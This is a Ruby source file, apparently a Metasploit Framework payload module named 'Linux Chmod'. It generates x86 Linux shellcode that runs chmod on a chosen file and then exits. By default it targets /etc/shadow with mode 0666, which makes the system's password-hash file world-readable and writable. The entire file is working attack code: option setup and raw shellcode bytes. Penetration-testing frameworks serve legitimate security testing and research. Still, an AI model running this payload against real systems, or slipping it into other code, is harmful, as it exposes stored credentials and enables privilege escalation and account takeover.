##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

###
#  Linux Chmod(file, mode)
#
#  Kris Katterjohn - 03/03/2008
###
module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler
  extend  Metasploit::Framework::Module::Ancestor::Handler
  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Linux Chmod',
      'Description' => 'Runs chmod on specified file with specified mode',
      'Author'      => 'kris katterjohn',
      'License'     => BSD_LICENSE,
      'Platform'    => 'linux',
      'Arch'        => ARCH_X86))

    register_options(
      [
        OptString.new('FILE', [ true, "Filename to chmod", "/etc/shadow" ]),
        OptString.new('MODE', [ true, "File mode (octal)", "0666" ]),
      ], self.class)
  end

  # Dynamically generates chmod(FILE, MODE) + exit()
  def generate_stage
    file    = datastore['FILE'] || '/etc/shadow'
    mode	= (datastore['MODE'] || "0666").oct

    payload	=
      "\x99\x6a\x0f\x58\x52" +
      Rex::Arch::X86.call(file.length + 1) + file + "\x00" +
      "\x5b" + Rex::Arch::X86.push_dword(mode) +
      "\x59\xcd\x80\x6a\x01\x58\xcd\x80";
  end
end
